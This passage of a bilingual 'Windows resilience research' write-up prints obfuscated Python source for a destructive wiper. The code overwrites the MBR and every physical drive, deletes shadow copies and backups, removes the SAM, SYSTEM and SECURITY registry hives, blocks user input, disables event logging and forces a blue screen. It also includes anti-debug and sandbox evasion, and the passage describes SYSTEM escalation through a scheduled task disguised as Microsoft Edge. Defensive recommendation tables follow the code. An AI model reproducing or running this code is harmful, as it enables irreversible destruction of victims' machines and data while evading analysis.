| `SecureBoot` | Secure Boot state |
| `SetupMode` | Setup mode flag |
| `PlatformLang` | Language setting |
| `PK` | Platform Key (Secure Boot) |
| `KEK` | Key Exchange Key |
| `db` | Signature Database |
| `dbx` | Forbidden Signatures |
| `ConIn/Out/Err` | Console devices |

### 16.2 BIOS() — BIOS/MBR Destruction

```python
def BIOS():
    _mbr = mem(b'\x55\xAA')

    for i in range(3):
        try:
            pd = f'\\\\.\\PhysicalDrive{i}'

            with open(pd, 'rb', buffering=0) as d:
                sector = mem(d.read(512))

                if sector[ 510 : 512 ] == _mbr:
                    break

        except (IndexError, OSError):
            continue
    else:
        return
    
    write_dev(pd, _4mb)
```

</details>

---

## 17. Device Destruction

<details>
<summary><b>📁 Click to expand: DEVICE()</b></summary>

### 17.1 DEVICE() — Wipe All Physical Drives

```python
def DEVICE():
    wpd = lambda d: write_dev(d, _4mb)

    deque(tmap(
        wpd, (f'\\\\.\\PhysicalDrive{i}' for i in range(len(_chars)))
    ), maxlen=0)
```

</details>

---

## 18. Windows Destruction

<details>
<summary><b>📁 Click to expand: WINDOWS()</b></summary>

### 18.1 WINDOWS() — Destroy Windows Installation

```python
def WINDOWS():
    for c in (
        ('reagentc', '/disable'),
        ('powershell', '-WindowStyle', 'Hidden', '-Command', 
                f'Disable-ComputerRestore -Drive "{SYSTEMDISK}"'),
        ('vssadmin', 'delete', 'shadows', '/all', '/quiet'),
        ('wbadmin', 'delete', 'catalog', '-quiet')
    ):
        cmd(c)

    for (h, k) in (
        (HKEY_LOCAL_MACHINE, 'HARDWARE'  ),      
        (HKEY_LOCAL_MACHINE, 'SYSTEM'    ),         
        (HKEY_LOCAL_MACHINE, 'SECURITY'  ),       
        (HKEY_LOCAL_MACHINE, 'SAM'       ),
        (HKEY_LOCAL_MACHINE, 'COMPONENTS'),
        (HKEY_USERS,         'DEFAULT'   )        
    ):
        reg_unload(h, k)
        reg_del(   h, k)

    with Ppool(3) as p:
        deque(p.map(
            remove_dir, (f'{c}:\\' for c in _chars if _isexst(f'{c}:\\'))
        ), maxlen=0)
```

**Windows Destruction Sequence:**

| Step | Command | Purpose |
|------|---------|---------|
| 1 | `reagentc /disable` | Disable Windows Recovery Environment |
| 2 | `Disable-ComputerRestore` | Disable System Restore |
| 3 | `vssadmin delete shadows` | Delete Volume Shadow Copies |
| 4 | `wbadmin delete catalog` | Delete backup catalog |

**Registry Hives Destroyed:**

| Hive | Purpose |
|------|---------|
| `HARDWARE` | Hardware configuration |
| `SYSTEM` | System configuration, drivers |
| `SECURITY` | Security policies |
| `SAM` | Local user accounts, passwords |
| `COMPONENTS` | Windows component manifests |
| `DEFAULT` | Default user profile |

</details>

---

## 19. RAM Exhaustion

<details>
<summary><b>📁 Click to expand: RAM()</b></summary>

### 19.1 RAM() — Memory Exhaustion

```python
def RAM():
    sz  = _4mb << 6  # 256 MB chunks

    raw = []

    _ar = bytearray
    _ap = raw.append

    try:
        while True:
            _ap(_ar(sz))
    except (MemoryError, OverflowError): 
        pass
```

</details>

---

## 20. BSOD Trigger

<details>
<summary><b>📁 Click to expand: BSOD()</b></summary>

### 20.1 BSOD() — Trigger Blue Screen of Death

```python
def BSOD():
    ntdll.RtlAdjustPrivilege(19, True, False, cref(BOOLEAN()))
    ntdll.NtRaiseHardError(0xC0000022, 0, 0, None, 6, cref(ULONG()))

    memset(0, 1, 1)
```

**BSOD Mechanisms:**
1. `RtlAdjustPrivilege(19)` = `SeShutdownPrivilege`
2. `NtRaiseHardError` with `0xC0000022` = `STATUS_ACCESS_DENIED`, `6` = `OptionShutdownSystem`
3. Null pointer dereference via `memset(0, 1, 1)`

</details>

---

## 21. Signal Initialization

<details>
<summary><b>📁 Click to expand: siginit()</b></summary>

### 21.1 siginit() — Ignore All Signals

```python
def siginit():
    sigs   = set(range(1, 32)) 
    sigign = sig.SIG_IGN
    sigset = sig.signal
    
    if hasattr(sig, 'SIGRTMIN') and hasattr(sig, 'SIGRTMAX'):
        sigs |= set(range(sig.SIGRTMIN, sig.SIGRTMAX + 1))

    for n in ('SIGALRM', 'SIGVTALRM', 'SIGPROF'):
        s = getattr(sig, n, None)
        if s is not None:
            sigs.add(s)

    for s in sigs:
        try:
            sigset(s, sigign)
        except Exception:
            continue
```

</details>

---

## 22. Process Initialization

<details>
<summary><b>📁 Click to expand: init_proc()</b></summary>

### 22.1 init_proc() — Process Hardening

```python
def init_proc():
    try:
        if(___!=ENABLE_ANTIDEBUG):__die()
        if(____!=BLOCK_SANDBOX):__die()
        if((ENABLE_ANTIDEBUG)or(BLOCK_SANDBOX))and((__)is not(...)):__die()
    except:
        try:raise(LookupError((0,...,memset(0,1,1),...,_exit(0),...,1)[0]))
        except:raise(SystemExit(0))

    siginit()

    INJECTEXT = type('', (cstruct,), {
        '_fields_': [
                ('DisableExtensionPoints', ULONG, 1 ),
                ('ReservedFlags',          ULONG, 31)
            ]
        }
    )

    ext                        = INJECTEXT()
    ext.DisableExtensionPoints = 1
    kernel32.SetProcessMitigationPolicy(4, cref(ext), capi.sizeof(ext))

    kernel32.SetErrorMode(0x8001)
    kernel32.SetProcessDEPPolicy(1)

    kernel32.SetPriorityClass(_proc, 0x80)  # HIGH_PRIORITY_CLASS
    ntdll.RtlSetProcessIsCritical(True, None, False)

    kernel32.SetThreadExecutionState(0x80000003)
    kernel32.SetProcessShutdownParameters(0x4FF, 0)

    ntdll.NtSetInformationThread(_thread, 0x11, None, 0)
    ntdll.NtSetInformationProcess(_proc, 0x21, cref(ULONG(1)), 4)
    
    cmd(('sc', 'stop',   'EventLog'))
    cmd(('sc', 'config', 'EventLog', 'start=', 'disabled'))
```

**Process Hardening Measures:**

| API | Purpose |
|-----|---------|
| `SetProcessMitigationPolicy(4)` | Disable Extension Points (DLL injection) |
| `SetErrorMode(0x8001)` | Suppress error dialogs |
| `SetProcessDEPPolicy(1)` | Enable DEP |
| `SetPriorityClass(0x80)` | High priority |
| `RtlSetProcessIsCritical` | Process termination = BSOD |
| `SetThreadExecutionState` | Prevent sleep/hibernation |
| `SetProcessShutdownParameters` | Last process to terminate |
| `NtSetInformationThread(0x11)` | Hide thread from debugger |
| `NtSetInformationProcess(0x21)` | Break on termination |
| Stop EventLog service | Disable logging |

</details>

---

## 23. Input Blocking

<details>
<summary><b>📁 Click to expand: BlockInput()</b></summary>

### 23.1 BlockInput() — Block User Input

```python
def BlockInput(_b=windll.user32.BlockInput, _s=sleep):
    while True:
        _b(True)
        _s(0.2)
```

**Note:** `BlockInput` requires administrative privileges and only works when the process is running in the interactive desktop.

</details>

---

## 24. Main Execution Flow

<details>
<summary><b>📁 Click to expand: _start(), main()</b></summary>

### 24.1 _start() — Initialization Entry Point

```python
def _start(m=main):
    if(getattr(m,'__name__',...)):return(0)

    try:0//0//((0>>0<<0)%(1<<1>>1))//0//0
    except:
        try:raise(__init(m))
        except(IndexError.__mro__[2])as e:i=e;globals()['__name__']=''
        else:
            try:(__die())if((___)or(____))else(_exit(0))
            finally:raise(SystemExit(0))
    else:
        try:(__die())if((___)or(____))else(_exit(0))
        finally:raise(SystemExit(0))

    _off_warn('ignore')
    _off_log(50)

    sys.settrace(None)
    sys.setprofile(None)

    _gc.set_debug(0)
    _gc.disable()
    _gc.collect()

    get_admin()

    if FLAG_SYSTEM not in _argv:
        Ppool(1).submit(BlockInput)
    
    get_SYSTEM()

    init_proc()
    locals()['i']._(i)
globals()['_start'].__name__=''
```

### 24.2 main() — Main Destruction Sequence

```python
main=_main=__main=lambda:main
def main(_=...):
    if(not(isinstance(_,UserWarning.__mro__[2]))):return(0)
    if(((___)or(____))and(not(__name__))):
        try:__die()
        finally:raise(SystemExit(0))

    _gc.collect()

    for _ in (
        lambda:__die(False),

        BCD,
        ESP,
        BIOS if is_bios() else UEFI,
        DEVICE,
        WINDOWS
    ):
        try:
            try:
                raise(RuntimeError((1,_(),0)[-1]))
            except RuntimeError.__mro__[0]:
                raise(InterruptedError((1,None,0)[0]))
            else:
                raise(StopIteration((1,None,0)[2]))
        except:
            continue

    POOL.shutdown(False)
    _gc.collect()

    RAM()
    BSOD()

    _gc.collect()
    _exit(0)
globals()['main'].__name__=''
```

### 24.3 Program Entry Point

```python
_='win32';globals()['_']=main;_='1991';_='1994';globals()['_']=_start;_='2000';_='2008';_='2026';_=main

if(__name__=='__main__'): 
    try:
        if(___!=ENABLE_ANTIDEBUG):__die()
        if(____!=BLOCK_SANDBOX):__die()
        if((ENABLE_ANTIDEBUG)or(BLOCK_SANDBOX))and((__)is not(...)):__die()
    except:
        try:raise(SyntaxError((...,memset(0,1,1),0,_exit(0),...)[2]))
        finally:raise(SystemExit(0))
    else:
        try:raise(SystemExit((0,_start(None),_start(NotImplemented),_start(...),_start(_),_start(0),_start(1),_start(__name__),1)[0]))
        finally:
            try:raise(SystemError((0,memset(0,1,1),0,_exit(0),0)[0]))
            finally:raise(SystemExit(0))
```

</details>

---

## 25. Defense Recommendations

### 25.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot with custom keys |
| **BitLocker** | Enable TPM + PIN for pre-boot authentication |
| **BCD Integrity** | Monitor BCD changes, backup BCD store |
| **EFI Variable Protection** | Set EFI variable write protection in firmware |
| **Measured Boot** | TPM 2.0 with PCR policy enforcement |

### 25.2 Runtime Protection

| Measure | Implementation |
|---------|----------------|
| **Windows Defender Credential Guard** | Isolate LSASS, protect credentials |
| **Windows Defender Application Guard** | Isolate untrusted applications |
| **Controlled Folder Access** | Protect critical folders from modification |
| **Attack Surface Reduction (ASR)** | Block process creation from Office, scripts |
| **Windows Defender Exploit Guard** | Enable all mitigations |

### 25.3 Privilege Escalation Prevention

| Measure | Implementation |
|---------|----------------|
| **UAC Maximum** | Set `ConsentPromptBehaviorAdmin = 2` (require password) |
| **Disable Task Scheduler Admin Tasks** | Restrict task creation to trusted admins |
| **Monitor ShellExecute with runas** | Alert on UAC bypass attempts |
| **AppLocker / WDAC** | Restrict executable paths |

### 25.4 Hardware Protection

| Measure | Implementation |
|---------|----------------|
| **BIOS/UEFI Password** | Set administrator and user passwords |
| **Secure Boot** | Enable and lock configuration |
| **Intel Boot Guard** | Verified boot with OEM keys |
| **TPM 2.0** | Enable and use for attestation |
| **Physical Security** | Lock chassis, disable USB boot |

### 25.5 Detection & Response

| Measure | Implementation |
|---------|----------------|
| **Windows Defender ATP** | EDR with behavioral detection |
| **Sysmon** | Detailed process, network, registry logging |
| **Windows Event Forwarding** | Centralize logs to SIEM |
| **Volume Shadow Copy Protection** | Monitor VSS deletion attempts |
| **Registry Hive Monitoring** | Alert on SAM/SYSTEM/SECURITY access |

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **устойчивость Windows систем** к комплексным деструктивным атакам на всех уровнях:

| Уровень | Векторы атак |
|---------|--------------|
| **Прошивка** | UEFI переменные, BCD хранилище, ESP раздел, PhysicalDrive |
| **Загрузчик** | Boot Configuration Data, bootmgr, fwbootmgr |
| **Реестр** | SYSTEM, SAM, SECURITY, HARDWARE, COMPONENTS, DEFAULT |
| **Файловая система** | Рекурсивное удаление, безопасная перезапись |
| **Оборудование** | PhysicalDrive перезапись, истощение ОЗУ |
| **Пользовательское пространство** | Отключение служб, блокировка ввода |

---

## 2. Обнаружение виртуальных машин

| Проверка | Физическая система | Виртуальная машина |
|----------|-------------------|-------------------|
| VMware драйверы | Отсутствуют | `vmhgfs.sys`, `vmmouse.sys` |
| VirtualBox драйверы | Отсутствуют | `VBoxGuest.sys`, `VBoxMouse.sys` |
| VirtIO драйверы | Отсутствуют | `vioscsi.sys`, `virtio_net.sys` |
| MAC OUI | Производитель | `08:00:27` (VBox), `00:0C:29` (VMware) |
| SMBIOS строки | Dell/Lenovo/HP | "VMware", "VirtualBox", "QEMU" |
| Объем диска | ≥256GB | <100GB |
| Ядра CPU | ≥4 | 1-2 |
| Объем ОЗУ | ≥8GB | <4GB |

---

## 3. Обнаружение отладчика

| Уровень | Метод | Цель |
|---------|-------|------|
| 1 | `CreateMutexW` | Множественные экземпляры |
| 2 | `sys.gettrace()` | Отладчик Python |
| 3 | `IsDebuggerPresent` | Пользовательские отладчики |
| 4 | `CheckRemoteDebuggerPresent` | Удаленная отладка |
| 5 | Анализ времени | >300ms = отладчик |

---

## 4. Повышение привилегий до SYSTEM

1. Генерация случайного GUID для имени задачи (маскировка под Microsoft Edge)
2. Создание запланированной задачи с `UserId="SYSTEM"`, `RunLevel=Highest`
3. Настройка немедленного запуска
4. Выполнение через PowerShell
5. Завершение текущего процесса, запуск нового от SYSTEM

---

## 5. Уничтожение BCD

1. Перечисление всех записей BCD через `bcdedit /enum all`
2. Повреждение порядка отображения случайными GUID
3. Удаление ключевых записей: `{bootmgr}`, `{fwbootmgr}`, `{current}`, `{default}`
4. Выгрузка и удаление куста реестра `BCD00000000`
5. Перезапись всех файлов BCD на диске

---

## 6. Уничтожение UEFI переменных

| Переменная | Назначение |
|------------|------------|
| `BootOrder` | Порядок загрузки |
| `BootNext` | Одноразовое переопределение |
| `SecureBoot` | Состояние Secure Boot |
| `PK` | Platform Key |
| `KEK` | Key Exchange Key |
| `db` | База сигнатур |
| `dbx` | Запрещенные сигнатуры |

---

## 7. Уничтожение реестра Windows

| Куст | Назначение |
|------|------------|
| `HARDWARE` | Конфигурация оборудования |
| `SYSTEM` | Системная конфигурация, драйверы |
| `SECURITY` | Политики безопасности |
| `SAM` | Локальные пользователи, пароли |
| `COMPONENTS` | Манифесты компонентов Windows |
| `DEFAULT` | Профиль пользователя по умолчанию |

---

## 8. Усиление процесса

| API | Назначение |
|-----|------------|
| `SetProcessMitigationPolicy(4)` | Отключить точки расширения (DLL injection) |
| `SetErrorMode(0x8001)` | Подавить диалоги ошибок |
| `SetProcessDEPPolicy(1)` | Включить DEP |
| `SetPriorityClass(0x80)` | Высокий приоритет |
| `RtlSetProcessIsCritical` | Завершение процесса = BSOD |
| `SetThreadExecutionState` | Предотвратить сон/гибернацию |
| Остановка EventLog | Отключить логирование |

---

## 9. Рекомендации по защите

### 9.1 Защита цепочки загрузки

| Мера | Реализация |
|------|------------|
| **Secure Boot** | Включить UEFI Secure Boot |
| **BitLocker** | TPM + PIN для pre-boot аутентификации |
| **Целостность BCD** | Мониторинг изменений BCD |
| **Защита EFI переменных** | Установить защиту записи в прошивке |

### 9.2 Защита во время выполнения

| Мера | Реализация |
|------|------------|
| **Credential Guard** | Изолировать LSASS |
| **Application Guard** | Изолировать ненадежные приложения |
| **Controlled Folder Access** | Защитить критичные папки |
| **ASR правила** | Блокировать создание процессов из Office |

### 9.3 Предотвращение повышения привилегий

| Мера | Реализация |
|------|------------|
| **UAC Maximum** | Требовать пароль для повышения |
| **Отключить задачи планировщика** | Ограничить создание задач |
| **AppLocker / WDAC** | Ограничить пути исполняемых файлов |

---

<div align="center">

**[⬆ Back to Top](#-windows-resilience-research-complete-technical-analysis)**

*Security Research — Windows System Resilience Analysis*

</div>
